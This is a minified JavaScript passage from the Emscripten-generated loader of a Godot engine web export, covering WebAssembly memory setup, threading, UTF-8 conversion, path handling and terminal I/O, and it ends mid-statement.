var Godot=(()=>{var _scriptDir="undefined"!=typeof document&&document.currentScript?document.currentScript.src:void 0;return function(Godot){function GROWABLE_HEAP_I8(){return wasmMemory.buffer!=buffer&&updateGlobalBufferAndViews(wasmMemory.buffer),HEAP8}function GROWABLE_HEAP_U8(){return wasmMemory.buffer!=buffer&&updateGlobalBufferAndViews(wasmMemory.buffer),HEAPU8}function GROWABLE_HEAP_I16(){return wasmMemory.buffer!=buffer&&updateGlobalBufferAndViews(wasmMemory.buffer),HEAP16}function GROWABLE_HEAP_U16(){return wasmMemory.buffer!=buffer&&updateGlobalBufferAndViews(wasmMemory.buffer),HEAPU16}function GROWABLE_HEAP_I32(){return wasmMemory.buffer!=buffer&&updateGlobalBufferAndViews(wasmMemory.buffer),HEAP32}function GROWABLE_HEAP_U32(){return wasmMemory.buffer!=buffer&&updateGlobalBufferAndViews(wasmMemory.buffer),HEAPU32}function GROWABLE_HEAP_F32(){return wasmMemory.buffer!=buffer&&updateGlobalBufferAndViews(wasmMemory.buffer),HEAPF32}function GROWABLE_HEAP_F64(){return wasmMemory.buffer!=buffer&&updateGlobalBufferAndViews(wasmMemory.buffer),HEAPF64}Godot=Godot||{};var Module=void 0!==Godot?Godot:{},readyPromiseResolve,readyPromiseReject;Module.ready=new Promise((function(resolve,reject){readyPromiseResolve=resolve,readyPromiseReject=reject})),["_main","__emscripten_thread_init","__emscripten_thread_exit","__emscripten_thread_crashed","__emscripten_tls_init","_pthread_self","executeNotifiedProxyingQueue","establishStackSpace","invokeEntryPoint","PThread","_emscripten_webgl_commit_frame","__Z14godot_web_mainiPPc","_fflush","__emwebxr_on_input_event","__emwebxr_on_simple_event","__emscripten_proxy_execute_task_queue","onRuntimeInitialized"].forEach((prop=>{Object.getOwnPropertyDescriptor(Module.ready,prop)||Object.defineProperty(Module.ready,prop,{get:()=>abort("You are getting "+prop+" on the Promise object, instead of the instance. Use .then() to get called back with the instance, see the MODULARIZE docs in src/settings.js"),set:()=>abort("You are setting "+prop+" on the Promise object, instead of the instance. Use .then() to get called back with the instance, see the MODULARIZE docs in src/settings.js")})}));var moduleOverrides=Object.assign({},Module),arguments_=[],thisProgram="./this.program",quit_=(status,toThrow)=>{throw toThrow},ENVIRONMENT_IS_WEB="object"==typeof window,ENVIRONMENT_IS_WORKER="function"==typeof importScripts,ENVIRONMENT_IS_NODE="object"==typeof process&&"object"==typeof process.versions&&"string"==typeof process.versions.node,ENVIRONMENT_IS_SHELL=!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_NODE&&!ENVIRONMENT_IS_WORKER;if(Module.ENVIRONMENT)throw new Error("Module.ENVIRONMENT has been deprecated. To force the environment, use the ENVIRONMENT compile-time option (for example, -sENVIRONMENT=web or -sENVIRONMENT=node)");var ENVIRONMENT_IS_PTHREAD=Module.ENVIRONMENT_IS_PTHREAD||!1,scriptDirectory="",read_,readAsync,readBinary,setWindowTitle;function locateFile(path){return Module.locateFile?Module.locateFile(path,scriptDirectory):scriptDirectory+path}function logExceptionOnExit(e){if(e instanceof ExitStatus)return;let toLog=e;e&&"object"==typeof e&&e.stack&&(toLog=[e,e.stack]),err("exiting due to exception: "+toLog)}if(ENVIRONMENT_IS_SHELL){if("object"==typeof process&&"function"==typeof require||"object"==typeof window||"function"==typeof importScripts)throw new Error("not compiled for this environment (did you build to HTML and try to run it not on the web, or set ENVIRONMENT to something - like node - and run it someplace else - like on the web?)");"undefined"!=typeof read&&(read_=function shell_read(f){return read(f)}),readBinary=function readBinary(f){let data;return"function"==typeof readbuffer?new Uint8Array(readbuffer(f)):(data=read(f,"binary"),assert("object"==typeof data),data)},readAsync=function readAsync(f,onload,onerror){setTimeout((()=>onload(readBinary(f))),0)},"undefined"!=typeof scriptArgs?arguments_=scriptArgs:void 0!==arguments&&(arguments_=arguments),"function"==typeof quit&&(quit_=(status,toThrow)=>{if(runtimeKeepaliveCounter)throw toThrow;logExceptionOnExit(toThrow),quit(status)}),"undefined"!=typeof print&&("undefined"==typeof console&&(console={}),console.log=print,console.warn=console.error="undefined"!=typeof printErr?printErr:print)}else{if(!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_WORKER)throw new Error("environment detection error");if(ENVIRONMENT_IS_WORKER?scriptDirectory=self.location.href:"undefined"!=typeof document&&document.currentScript&&(scriptDirectory=document.currentScript.src),_scriptDir&&(scriptDirectory=_scriptDir),scriptDirectory=0!==scriptDirectory.indexOf("blob:")?scriptDirectory.substr(0,scriptDirectory.replace(/[?#].*/,"").lastIndexOf("/")+1):"","object"!=typeof window&&"function"!=typeof importScripts)throw new Error("not compiled for this environment (did you build to HTML and try to run it not on the web, or set ENVIRONMENT to something - like node - and run it someplace else - like on the web?)");read_=url=>{var xhr=new XMLHttpRequest;return xhr.open("GET",url,!1),xhr.send(null),xhr.responseText},ENVIRONMENT_IS_WORKER&&(readBinary=url=>{var xhr=new XMLHttpRequest;return xhr.open("GET",url,!1),xhr.responseType="arraybuffer",xhr.send(null),new Uint8Array(xhr.response)}),readAsync=(url,onload,onerror)=>{var xhr=new XMLHttpRequest;xhr.open("GET",url,!0),xhr.responseType="arraybuffer",xhr.onload=()=>{200==xhr.status||0==xhr.status&&xhr.response?onload(xhr.response):onerror()},xhr.onerror=onerror,xhr.send(null)},setWindowTitle=title=>document.title=title}var out=Module.print||console.log.bind(console),err=Module.printErr||console.warn.bind(console);Object.assign(Module,moduleOverrides),moduleOverrides=null,checkIncomingModuleAPI(),Module.arguments&&(arguments_=Module.arguments),legacyModuleProp("arguments","arguments_"),Module.thisProgram&&(thisProgram=Module.thisProgram),legacyModuleProp("thisProgram","thisProgram"),Module.quit&&(quit_=Module.quit),legacyModuleProp("quit","quit_"),assert(void 0===Module.memoryInitializerPrefixURL,"Module.memoryInitializerPrefixURL option was removed, use Module.locateFile instead"),assert(void 0===Module.pthreadMainPrefixURL,"Module.pthreadMainPrefixURL option was removed, use Module.locateFile instead"),assert(void 0===Module.cdInitializerPrefixURL,"Module.cdInitializerPrefixURL option was removed, use Module.locateFile instead"),assert(void 0===Module.filePackagePrefixURL,"Module.filePackagePrefixURL option was removed, use Module.locateFile instead"),assert(void 0===Module.read,"Module.read option was removed (modify read_ in JS)"),assert(void 0===Module.readAsync,"Module.readAsync option was removed (modify readAsync in JS)"),assert(void 0===Module.readBinary,"Module.readBinary option was removed (modify readBinary in JS)"),assert(void 0===Module.setWindowTitle,"Module.setWindowTitle option was removed (modify setWindowTitle in JS)"),assert(void 0===Module.TOTAL_MEMORY,"Module.TOTAL_MEMORY has been renamed Module.INITIAL_MEMORY"),legacyModuleProp("read","read_"),legacyModuleProp("readAsync","readAsync"),legacyModuleProp("readBinary","readBinary"),legacyModuleProp("setWindowTitle","setWindowTitle");var PROXYFS="PROXYFS is no longer included by default; build with -lproxyfs.js",WORKERFS="WORKERFS is no longer included by default; build with -lworkerfs.js",NODEFS="NODEFS is no longer included by default; build with -lnodefs.js";assert(ENVIRONMENT_IS_WEB||ENVIRONMENT_IS_WORKER||ENVIRONMENT_IS_NODE,"Pthreads do not work in this environment yet (need Web Workers, or an alternative to them)"),assert(!ENVIRONMENT_IS_NODE,"node environment detected but not enabled at build time.  Add 'node' to `-sENVIRONMENT` to enable."),assert(!ENVIRONMENT_IS_SHELL,"shell environment detected but not enabled at build time.  Add 'shell' to `-sENVIRONMENT` to enable.");var STACK_ALIGN=16,POINTER_SIZE=4;function getNativeTypeSize(type){switch(type){case"i1":case"i8":case"u8":return 1;case"i16":case"u16":return 2;case"i32":case"u32":case"float":return 4;case"i64":case"u64":case"double":return 8;default:if("*"===type[type.length-1])return POINTER_SIZE;if("i"===type[0]){const bits=Number(type.substr(1));return assert(bits%8==0,"getNativeTypeSize invalid bits "+bits+", type "+type),bits/8}return 0}}function legacyModuleProp(prop,newName){Object.getOwnPropertyDescriptor(Module,prop)||Object.defineProperty(Module,prop,{configurable:!0,get:function(){abort("Module."+prop+" has been replaced with plain "+newName+" (the initial value can be provided on Module, but after startup the value is only looked for on a local variable of that name)")}})}function ignoredModuleProp(prop){Object.getOwnPropertyDescriptor(Module,prop)&&abort("`Module."+prop+"` was supplied but `"+prop+"` not included in INCOMING_MODULE_JS_API")}function isExportedByForceFilesystem(name){return"FS_createPath"===name||"FS_createDataFile"===name||"FS_createPreloadedFile"===name||"FS_unlink"===name||"addRunDependency"===name||"FS_createLazyFile"===name||"FS_createDevice"===name||"removeRunDependency"===name}function missingLibrarySymbol(sym){"undefined"==typeof globalThis||Object.getOwnPropertyDescriptor(globalThis,sym)||Object.defineProperty(globalThis,sym,{configurable:!0,get:function(){var msg="`"+sym+"` is a library symbol and not included by default; add it to your library.js __deps or to DEFAULT_LIBRARY_FUNCS_TO_INCLUDE on the command line";isExportedByForceFilesystem(sym)&&(msg+=". Alternatively, forcing filesystem support (-sFORCE_FILESYSTEM) can export this for you"),warnOnce(msg)}})}function unexportedRuntimeSymbol(sym){Object.getOwnPropertyDescriptor(Module,sym)||Object.defineProperty(Module,sym,{configurable:!0,get:function(){var msg="'"+sym+"' was not exported. add it to EXPORTED_RUNTIME_METHODS (see the FAQ)";isExportedByForceFilesystem(sym)&&(msg+=". Alternatively, forcing filesystem support (-sFORCE_FILESYSTEM) can export this for you"),abort(msg)}})}var tempRet0=0,setTempRet0=value=>{tempRet0=value},getTempRet0=()=>tempRet0,Atomics_load=Atomics.load,Atomics_store=Atomics.store,Atomics_compareExchange=Atomics.compareExchange,wasmBinary;Module.wasmBinary&&(wasmBinary=Module.wasmBinary),legacyModuleProp("wasmBinary","wasmBinary");var noExitRuntime=Module.noExitRuntime||!1,wasmMemory,wasmModule;legacyModuleProp("noExitRuntime","noExitRuntime"),"object"!=typeof WebAssembly&&abort("no native wasm support detected");var ABORT=!1,EXITSTATUS;function assert(condition,text){condition||abort("Assertion failed"+(text?": "+text:""))}var UTF8Decoder="undefined"!=typeof TextDecoder?new TextDecoder("utf8"):void 0,HEAP,buffer,HEAP8,HEAPU8,HEAP16,HEAPU16,HEAP32,HEAPU32,HEAPF32,HEAPF64;function UTF8ArrayToString(heapOrArray,idx,maxBytesToRead){for(var endIdx=idx+maxBytesToRead,endPtr=idx;heapOrArray[endPtr]&&!(endPtr>=endIdx);)++endPtr;if(endPtr-idx>16&&heapOrArray.buffer&&UTF8Decoder)return UTF8Decoder.decode(heapOrArray.buffer instanceof SharedArrayBuffer?heapOrArray.slice(idx,endPtr):heapOrArray.subarray(idx,endPtr));for(var str="";idx<endPtr;){var u0=heapOrArray[idx++];if(128&u0){var u1=63&heapOrArray[idx++];if(192!=(224&u0)){var u2=63&heapOrArray[idx++];if(224==(240&u0)?u0=(15&u0)<<12|u1<<6|u2:(240!=(248&u0)&&warnOnce("Invalid UTF-8 leading byte 0x"+u0.toString(16)+" encountered when deserializing a UTF-8 string in wasm memory to a JS string!"),u0=(7&u0)<<18|u1<<12|u2<<6|63&heapOrArray[idx++]),u0<65536)str+=String.fromCharCode(u0);else{var ch=u0-65536;str+=String.fromCharCode(55296|ch>>10,56320|1023&ch)}}else str+=String.fromCharCode((31&u0)<<6|u1)}else str+=String.fromCharCode(u0)}return str}function UTF8ToString(ptr,maxBytesToRead){return ptr?UTF8ArrayToString(GROWABLE_HEAP_U8(),ptr,maxBytesToRead):""}function stringToUTF8Array(str,heap,outIdx,maxBytesToWrite){if(!(maxBytesToWrite>0))return 0;for(var startIdx=outIdx,endIdx=outIdx+maxBytesToWrite-1,i=0;i<str.length;++i){var u=str.charCodeAt(i);if(u>=55296&&u<=57343)u=65536+((1023&u)<<10)|1023&str.charCodeAt(++i);if(u<=127){if(outIdx>=endIdx)break;heap[outIdx++]=u}else if(u<=2047){if(outIdx+1>=endIdx)break;heap[outIdx++]=192|u>>6,heap[outIdx++]=128|63&u}else if(u<=65535){if(outIdx+2>=endIdx)break;heap[outIdx++]=224|u>>12,heap[outIdx++]=128|u>>6&63,heap[outIdx++]=128|63&u}else{if(outIdx+3>=endIdx)break;u>1114111&&warnOnce("Invalid Unicode code point 0x"+u.toString(16)+" encountered when serializing a JS string to a UTF-8 string in wasm memory! (Valid unicode code points should be in range 0-0x10FFFF)."),heap[outIdx++]=240|u>>18,heap[outIdx++]=128|u>>12&63,heap[outIdx++]=128|u>>6&63,heap[outIdx++]=128|63&u}}return heap[outIdx]=0,outIdx-startIdx}function stringToUTF8(str,outPtr,maxBytesToWrite){return assert("number"==typeof maxBytesToWrite,"stringToUTF8(str, outPtr, maxBytesToWrite) is missing the third parameter that specifies the length of the output buffer!"),stringToUTF8Array(str,GROWABLE_HEAP_U8(),outPtr,maxBytesToWrite)}function lengthBytesUTF8(str){for(var len=0,i=0;i<str.length;++i){var c=str.charCodeAt(i);c<=127?len++:c<=2047?len+=2:c>=55296&&c<=57343?(len+=4,++i):len+=3}return len}function updateGlobalBufferAndViews(buf){buffer=buf,Module.HEAP8=HEAP8=new Int8Array(buf),Module.HEAP16=HEAP16=new Int16Array(buf),Module.HEAP32=HEAP32=new Int32Array(buf),Module.HEAPU8=HEAPU8=new Uint8Array(buf),Module.HEAPU16=HEAPU16=new Uint16Array(buf),Module.HEAPU32=HEAPU32=new Uint32Array(buf),Module.HEAPF32=HEAPF32=new Float32Array(buf),Module.HEAPF64=HEAPF64=new Float64Array(buf)}ENVIRONMENT_IS_PTHREAD&&(buffer=Module.buffer);var TOTAL_STACK=5242880;Module.TOTAL_STACK&&assert(TOTAL_STACK===Module.TOTAL_STACK,"the stack size can no longer be determined at runtime");var INITIAL_MEMORY=Module.INITIAL_MEMORY||33554432,wasmTable;if(legacyModuleProp("INITIAL_MEMORY","INITIAL_MEMORY"),assert(INITIAL_MEMORY>=TOTAL_STACK,"INITIAL_MEMORY should be larger than TOTAL_STACK, was "+INITIAL_MEMORY+"! (TOTAL_STACK="+TOTAL_STACK+")"),assert("undefined"!=typeof Int32Array&&"undefined"!=typeof Float64Array&&null!=Int32Array.prototype.subarray&&null!=Int32Array.prototype.set,"JS engine does not provide full typed array support"),ENVIRONMENT_IS_PTHREAD)wasmMemory=Module.wasmMemory,buffer=Module.buffer;else if(Module.wasmMemory)wasmMemory=Module.wasmMemory;else if(wasmMemory=new WebAssembly.Memory({initial:INITIAL_MEMORY/65536,maximum:32768,shared:!0}),!(wasmMemory.buffer instanceof SharedArrayBuffer))throw err("requested a shared WebAssembly.Memory but the returned buffer is not a SharedArrayBuffer, indicating that while the browser has SharedArrayBuffer it does not have WebAssembly threads support - you may need to set a flag"),ENVIRONMENT_IS_NODE&&console.log("(on node you may need: --experimental-wasm-threads --experimental-wasm-bulk-memory and also use a recent version)"),Error("bad memory");function writeStackCookie(){var max=_emscripten_stack_get_end();assert(0==(3&max)),GROWABLE_HEAP_I32()[max>>2]=34821223,GROWABLE_HEAP_I32()[max+4>>2]=2310721022,GROWABLE_HEAP_U32()[0]=1668509029}function checkStackCookie(){if(!ABORT){var max=_emscripten_stack_get_end(),cookie1=GROWABLE_HEAP_U32()[max>>2],cookie2=GROWABLE_HEAP_U32()[max+4>>2];34821223==cookie1&&2310721022==cookie2||abort("Stack overflow! Stack cookie has been overwritten at 0x"+max.toString(16)+", expected hex dwords 0x89BACDFE and 0x2135467, but received 0x"+cookie2.toString(16)+" 0x"+cookie1.toString(16)),1668509029!==GROWABLE_HEAP_U32()[0]&&abort("Runtime error: The application has corrupted its heap memory area (address zero)!")}}wasmMemory&&(buffer=wasmMemory.buffer),INITIAL_MEMORY=buffer.byteLength,assert(INITIAL_MEMORY%65536==0),updateGlobalBufferAndViews(buffer),function(){var h16=new Int16Array(1),h8=new Int8Array(h16.buffer);if(h16[0]=25459,115!==h8[0]||99!==h8[1])throw"Runtime error: expected the system to be little-endian! (Run with -sSUPPORT_BIG_ENDIAN to bypass)"}();var __ATPRERUN__=[],__ATINIT__=[],__ATMAIN__=[],__ATEXIT__=[],__ATPOSTRUN__=[],runtimeInitialized=!1,runtimeExited=!1,runtimeKeepaliveCounter=0;function keepRuntimeAlive(){return noExitRuntime||runtimeKeepaliveCounter>0}function preRun(){if(assert(!ENVIRONMENT_IS_PTHREAD),Module.preRun)for("function"==typeof Module.preRun&&(Module.preRun=[Module.preRun]);Module.preRun.length;)addOnPreRun(Module.preRun.shift());callRuntimeCallbacks(__ATPRERUN__)}function initRuntime(){assert(!runtimeInitialized),runtimeInitialized=!0,ENVIRONMENT_IS_PTHREAD||(checkStackCookie(),Module.noFSInit||FS.init.initialized||FS.init(),FS.ignorePermissions=!1,TTY.init(),SOCKFS.root=FS.mount(SOCKFS,{},null),callRuntimeCallbacks(__ATINIT__))}function preMain(){checkStackCookie(),ENVIRONMENT_IS_PTHREAD||callRuntimeCallbacks(__ATMAIN__)}function exitRuntime(){checkStackCookie(),ENVIRONMENT_IS_PTHREAD||(___funcs_on_exit(),callRuntimeCallbacks(__ATEXIT__),FS.quit(),TTY.shutdown(),IDBFS.quit(),PThread.terminateAllThreads(),runtimeExited=!0)}function postRun(){if(checkStackCookie(),!ENVIRONMENT_IS_PTHREAD){if(Module.postRun)for("function"==typeof Module.postRun&&(Module.postRun=[Module.postRun]);Module.postRun.length;)addOnPostRun(Module.postRun.shift());callRuntimeCallbacks(__ATPOSTRUN__)}}function addOnPreRun(cb){__ATPRERUN__.unshift(cb)}function addOnInit(cb){__ATINIT__.unshift(cb)}function addOnPreMain(cb){__ATMAIN__.unshift(cb)}function addOnExit(cb){__ATEXIT__.unshift(cb)}function addOnPostRun(cb){__ATPOSTRUN__.unshift(cb)}assert(Math.imul,"This browser does not support Math.imul(), build with LEGACY_VM_SUPPORT or POLYFILL_OLD_MATH_FUNCTIONS to add in a polyfill"),assert(Math.fround,"This browser does not support Math.fround(), build with LEGACY_VM_SUPPORT or POLYFILL_OLD_MATH_FUNCTIONS to add in a polyfill"),assert(Math.clz32,"This browser does not support Math.clz32(), build with LEGACY_VM_SUPPORT or POLYFILL_OLD_MATH_FUNCTIONS to add in a polyfill"),assert(Math.trunc,"This browser does not support Math.trunc(), build with LEGACY_VM_SUPPORT or POLYFILL_OLD_MATH_FUNCTIONS to add in a polyfill");var runDependencies=0,runDependencyWatcher=null,dependenciesFulfilled=null,runDependencyTracking={};function getUniqueRunDependency(id){for(var orig=id;;){if(!runDependencyTracking[id])return id;id=orig+Math.random()}}function addRunDependency(id){runDependencies++,Module.monitorRunDependencies&&Module.monitorRunDependencies(runDependencies),id?(assert(!runDependencyTracking[id]),runDependencyTracking[id]=1,null===runDependencyWatcher&&"undefined"!=typeof setInterval&&(runDependencyWatcher=setInterval((function(){if(ABORT)return clearInterval(runDependencyWatcher),void(runDependencyWatcher=null);var shown=!1;for(var dep in runDependencyTracking)shown||(shown=!0,err("still waiting on run dependencies:")),err("dependency: "+dep);shown&&err("(end of list)")}),1e4))):err("warning: run dependency added without ID")}function removeRunDependency(id){if(runDependencies--,Module.monitorRunDependencies&&Module.monitorRunDependencies(runDependencies),id?(assert(runDependencyTracking[id]),delete runDependencyTracking[id]):err("warning: run dependency removed without ID"),0==runDependencies&&(null!==runDependencyWatcher&&(clearInterval(runDependencyWatcher),runDependencyWatcher=null),dependenciesFulfilled)){var callback=dependenciesFulfilled;dependenciesFulfilled=null,callback()}}function abort(what){ENVIRONMENT_IS_PTHREAD?postMessage({cmd:"onAbort",arg:what}):Module.onAbort&&Module.onAbort(what),err(what="Aborted("+what+")"),ABORT=!0,EXITSTATUS=1;var e=new WebAssembly.RuntimeError(what);throw readyPromiseReject(e),e}var dataURIPrefix="data:application/octet-stream;base64,",wasmBinaryFile,tempDouble,tempI64;function isDataURI(filename){return filename.startsWith(dataURIPrefix)}function isFileURI(filename){return filename.startsWith("file://")}function createExportWrapper(name,fixedasm){return function(){var displayName=name,asm=fixedasm;return fixedasm||(asm=Module.asm),assert(runtimeInitialized,"native function `"+displayName+"` called before runtime initialization"),assert(!runtimeExited,"native function `"+displayName+"` called after runtime exit (use NO_EXIT_RUNTIME to keep it alive after main() exits)"),asm[name]||assert(asm[name],"exported native function `"+displayName+"` not found"),asm[name].apply(null,arguments)}}function getBinary(file){try{if(file==wasmBinaryFile&&wasmBinary)return new Uint8Array(wasmBinary);if(readBinary)return readBinary(file);throw"both async and sync fetching of the wasm failed"}catch(err){abort(err)}}function getBinaryPromise(){return wasmBinary||!ENVIRONMENT_IS_WEB&&!ENVIRONMENT_IS_WORKER||"function"!=typeof fetch?Promise.resolve().then((function(){return getBinary(wasmBinaryFile)})):fetch(wasmBinaryFile,{credentials:"same-origin"}).then((function(response){if(!response.ok)throw"failed to load wasm binary file at '"+wasmBinaryFile+"'";return response.arrayBuffer()})).catch((function(){return getBinary(wasmBinaryFile)}))}function createWasm(){var info={env:asmLibraryArg,wasi_snapshot_preview1:asmLibraryArg};function receiveInstance(instance,module){var exports=instance.exports;if(Module.asm=exports,registerTLSInit(Module.asm._emscripten_tls_init),assert(wasmTable=Module.asm.__indirect_function_table,"table not found in wasm exports"),addOnInit(Module.asm.__wasm_call_ctors),wasmModule=module,!ENVIRONMENT_IS_PTHREAD){var numWorkersToLoad=PThread.unusedWorkers.length;PThread.unusedWorkers.forEach((function(w){PThread.loadWasmModuleToWorker(w,(function(){--numWorkersToLoad||removeRunDependency("wasm-instantiate")}))}))}}ENVIRONMENT_IS_PTHREAD||addRunDependency("wasm-instantiate");var trueModule=Module;function receiveInstantiationResult(result){assert(Module===trueModule,"the Module object should not be replaced during async compilation - perhaps the order of HTML elements is wrong?"),trueModule=null,receiveInstance(result.instance,result.module)}function instantiateArrayBuffer(receiver){return getBinaryPromise().then((function(binary){return WebAssembly.instantiate(binary,info)})).then((function(instance){return instance})).then(receiver,(function(reason){err("failed to asynchronously prepare wasm: "+reason),isFileURI(wasmBinaryFile)&&err("warning: Loading from a file URI ("+wasmBinaryFile+") is not supported in most browsers. See https://emscripten.org/docs/getting_started/FAQ.html#how-do-i-run-a-local-webserver-for-testing-why-does-my-program-stall-in-downloading-or-preparing"),abort(reason)}))}if(Module.instantiateWasm)try{return Module.instantiateWasm(info,receiveInstance)}catch(e){return err("Module.instantiateWasm callback failed with error: "+e),!1}return function instantiateAsync(){return wasmBinary||"function"!=typeof WebAssembly.instantiateStreaming||isDataURI(wasmBinaryFile)||"function"!=typeof fetch?instantiateArrayBuffer(receiveInstantiationResult):fetch(wasmBinaryFile,{credentials:"same-origin"}).then((function(response){return WebAssembly.instantiateStreaming(response,info).then(receiveInstantiationResult,(function(reason){return err("wasm streaming compile failed: "+reason),err("falling back to ArrayBuffer instantiation"),instantiateArrayBuffer(receiveInstantiationResult)}))}))}().catch(readyPromiseReject),{}}wasmBinaryFile="godot.web.template_release.wasm32.wasm",isDataURI(wasmBinaryFile)||(wasmBinaryFile=locateFile(wasmBinaryFile));var ASM_CONSTS={};function ExitStatus(status){this.name="ExitStatus",this.message="Program terminated with exit("+status+")",this.status=status}function killThread(pthread_ptr){assert(!ENVIRONMENT_IS_PTHREAD,"Internal Error! killThread() can only ever be called from main application thread!"),assert(pthread_ptr,"Internal Error! Null pthread_ptr in killThread!");var worker=PThread.pthreads[pthread_ptr];delete PThread.pthreads[pthread_ptr],worker.terminate(),__emscripten_thread_free_data(pthread_ptr),PThread.runningWorkers.splice(PThread.runningWorkers.indexOf(worker),1),worker.pthread_ptr=0}function cancelThread(pthread_ptr){assert(!ENVIRONMENT_IS_PTHREAD,"Internal Error! cancelThread() can only ever be called from main application thread!"),assert(pthread_ptr,"Internal Error! Null pthread_ptr in cancelThread!"),PThread.pthreads[pthread_ptr].postMessage({cmd:"cancel"})}function cleanupThread(pthread_ptr){assert(!ENVIRONMENT_IS_PTHREAD,"Internal Error! cleanupThread() can only ever be called from main application thread!"),assert(pthread_ptr,"Internal Error! Null pthread_ptr in cleanupThread!");var worker=PThread.pthreads[pthread_ptr];assert(worker),PThread.returnWorkerToPool(worker)}function zeroMemory(address,size){GROWABLE_HEAP_U8().fill(0,address,address+size)}function spawnThread(threadParams){assert(!ENVIRONMENT_IS_PTHREAD,"Internal Error! spawnThread() can only ever be called from main application thread!"),assert(threadParams.pthread_ptr,"Internal error, no pthread ptr!");var worker=PThread.getNewWorker();if(!worker)return 6;assert(!worker.pthread_ptr,"Internal error!"),PThread.runningWorkers.push(worker),PThread.pthreads[threadParams.pthread_ptr]=worker,worker.pthread_ptr=threadParams.pthread_ptr;var msg={cmd:"run",start_routine:threadParams.startRoutine,arg:threadParams.arg,pthread_ptr:threadParams.pthread_ptr};return worker.runPthread=()=>{msg.time=performance.now(),worker.postMessage(msg,threadParams.transferList)},worker.loaded&&(worker.runPthread(),delete worker.runPthread),0}var PATH={isAbs:path=>"/"===path.charAt(0),splitPath:filename=>/^(\/?|)([\s\S]*?)((?:\.{1,2}|[^\/]+?|)(\.[^.\/]*|))(?:[\/]*)$/.exec(filename).slice(1),normalizeArray:(parts,allowAboveRoot)=>{for(var up=0,i=parts.length-1;i>=0;i--){var last=parts[i];"."===last?parts.splice(i,1):".."===last?(parts.splice(i,1),up++):up&&(parts.splice(i,1),up--)}if(allowAboveRoot)for(;up;up--)parts.unshift("..");return parts},normalize:path=>{var isAbsolute=PATH.isAbs(path),trailingSlash="/"===path.substr(-1);return(path=PATH.normalizeArray(path.split("/").filter((p=>!!p)),!isAbsolute).join("/"))||isAbsolute||(path="."),path&&trailingSlash&&(path+="/"),(isAbsolute?"/":"")+path},dirname:path=>{var result=PATH.splitPath(path),root=result[0],dir=result[1];return root||dir?(dir&&(dir=dir.substr(0,dir.length-1)),root+dir):"."},basename:path=>{if("/"===path)return"/";var lastSlash=(path=(path=PATH.normalize(path)).replace(/\/$/,"")).lastIndexOf("/");return-1===lastSlash?path:path.substr(lastSlash+1)},join:function(){var paths=Array.prototype.slice.call(arguments,0);return PATH.normalize(paths.join("/"))},join2:(l,r)=>PATH.normalize(l+"/"+r)};function getRandomDevice(){if("object"==typeof crypto&&"function"==typeof crypto.getRandomValues){var randomBuffer=new Uint8Array(1);return()=>(crypto.getRandomValues(randomBuffer),randomBuffer[0])}return()=>abort("no cryptographic support found for randomDevice. consider polyfilling it if you want to use something insecure like Math.random(), e.g. put this in a --pre-js: var crypto = { getRandomValues: function(array) { for (var i = 0; i < array.length; i++) array[i] = (Math.random()*256)|0 } };")}var PATH_FS={resolve:function(){for(var resolvedPath="",resolvedAbsolute=!1,i=arguments.length-1;i>=-1&&!resolvedAbsolute;i--){var path=i>=0?arguments[i]:FS.cwd();if("string"!=typeof path)throw new TypeError("Arguments to path.resolve must be strings");if(!path)return"";resolvedPath=path+"/"+resolvedPath,resolvedAbsolute=PATH.isAbs(path)}return(resolvedAbsolute?"/":"")+(resolvedPath=PATH.normalizeArray(resolvedPath.split("/").filter((p=>!!p)),!resolvedAbsolute).join("/"))||"."},relative:(from,to)=>{function trim(arr){for(var start=0;start<arr.length&&""===arr[start];start++);for(var end=arr.length-1;end>=0&&""===arr[end];end--);return start>end?[]:arr.slice(start,end-start+1)}from=PATH_FS.resolve(from).substr(1),to=PATH_FS.resolve(to).substr(1);for(var fromParts=trim(from.split("/")),toParts=trim(to.split("/")),length=Math.min(fromParts.length,toParts.length),samePartsLength=length,i=0;i<length;i++)if(fromParts[i]!==toParts[i]){samePartsLength=i;break}var outputParts=[];for(i=samePartsLength;i<fromParts.length;i++)outputParts.push("..");return(outputParts=outputParts.concat(toParts.slice(samePartsLength))).join("/")}};function intArrayFromString(stringy,dontAddNull,length){var len=length>0?length:lengthBytesUTF8(stringy)+1,u8array=new Array(len),numBytesWritten=stringToUTF8Array(stringy,u8array,0,u8array.length);return dontAddNull&&(u8array.length=numBytesWritten),u8array}var TTY={ttys:[],init:function(){},shutdown:function(){},register:function(dev,ops){TTY.ttys[dev]={input:[],output:[],ops:ops},FS.registerDevice(dev,TTY.stream_ops)},stream_ops:{open:function(stream){var tty=TTY.ttys[stream.node.rdev];if(!tty)throw new FS.ErrnoError(43);stream.tty=tty,stream.seekable=!1},close:function(stream){stream.tty.ops.flush(stream.tty)},flush:function(stream){stream.tty.ops.flush(stream.tty)},read:function(stream,buffer,offset,length,pos){if(!stream.tty||!stream.tty.ops.get_char)throw new FS.ErrnoError(60);for(var bytesRead=0,i=0;i<length;i++){var result;try{result=stream.tty.ops.get_char(stream.tty)}catch(e){throw new FS.ErrnoError(29)}if(void 0===result&&0===bytesRead)throw new FS.ErrnoError(6);if(null==result)break;bytesRead++,buffer[offset+i]=result}return bytesRead&&(stream.node.timestamp=Date.now()),bytesRead},write:function(stream,buffer,offset,length,pos){if(!stream.tty||!stream.tty.ops.put_char)throw new FS.ErrnoError(60);try{for(var i=0;i<length;i++)stream.tty.ops.put_char(stream.tty,buffer[offset+i])}catch(e){throw new FS.ErrnoError(29)}return length&&(stream.node.timestamp=Date.now()),i}},default_tty_ops:{get_char:function(tty){if(!tty.input.length){var result=null;if("undefined"!=typeof window&&"function"==typeof window.prompt?null!==(result=window.prompt("Input: "))&&(result+="\n"):"function"==typeof readline&&null!==(result=readline())&&(result+="\n"),!result)return null;tty.input=intArrayFromString(result,!0)}return tty.input.shift()},put_char:function(tty,val){null===val||10===val?(out(UTF8ArrayToString(tty.output,0)),tty.output=[]):0!=val&&tty.output.push(val)},flush:function(tty){tty.output&&tty.output.length>0&&(out(UTF8ArrayToString(tty.output,0)),tty.output=[])}},default_tty1_ops:{put_char:function(tty,val){null===val||10===val?(err(UTF8ArrayToString(tty.output,0)),tty.output=[]):0!=val&&tty.output.push(val)},flush:function(tty){tty.output&&tty.output.length>0&&(err(UTF8ArrayToString(tty.output,0)),tty.output=[])}}};function alignMemory(size,alignment){return assert(alignment,"alignment argument is required"),Math.ceil(size/alignment)*alignment}function mmapAlloc(size){size=alignMemory(size,65536);var ptr=_emscripten_builtin_memalign(65536,size);return ptr?(zeroMemory(ptr,size),ptr):0}var 